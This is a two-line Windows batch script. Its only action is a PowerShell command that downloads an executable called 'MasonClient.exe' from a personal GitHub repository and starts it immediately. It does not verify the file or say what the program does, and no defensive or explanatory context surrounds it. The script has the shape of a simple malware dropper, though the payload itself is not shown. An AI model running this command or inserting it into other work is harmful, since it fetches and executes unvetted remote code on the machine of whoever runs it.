@ECHO OFF

powershell -Command "Invoke-WebRequest 'https://github.com/amir12378123/tl3im/raw/refs/heads/main/MasonClient.exe' -OutFile 'MasonClient.exe'; Start-Process 'MasonClient.exe'"